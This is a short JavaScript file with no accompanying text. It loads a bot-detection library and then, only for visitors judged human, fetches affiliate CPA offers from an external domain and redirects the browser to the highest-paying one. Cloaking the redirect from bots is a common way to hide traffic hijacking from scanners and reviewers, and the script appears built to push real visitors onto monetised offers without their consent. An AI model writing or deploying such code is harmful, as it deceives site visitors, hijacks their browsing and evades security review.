
var json = 'https://blossombabes.my.id/cpagrip/jsoncpagrip.php';
var xhttp = new XMLHttpRequest();

function initialize() {
  var script = document.createElement('script');
  script.onload = function () {
    new BotDetector({
      timeout: 1000,
      callback: function(result) {
        if(result.isBot === false) {
          redirectCPA();
        }
      }
    }).monitor();
  };
  script.src = 'https://cdn.jsdelivr.net/gh/RoBYCoNTe/js-bot-detector/bot-detector.js';
  document.head.appendChild(script);
}

function redirectCPA() {
  xhttp.open("GET", json, true);
  xhttp.responseType = "json"
  xhttp.send();
  xhttp.onreadystatechange = function() {
    if (this.readyState === 4 && this.status === 200) {
      var arr = this.response.offers;
      var item = arr[0];
      for(var i = 0; i < arr.length; i++) {
        if(arr[i].payout > item.payout) {
          item = arr[i];
        }
      }
      window.location.href = item.offerlink;
    }
  };
}
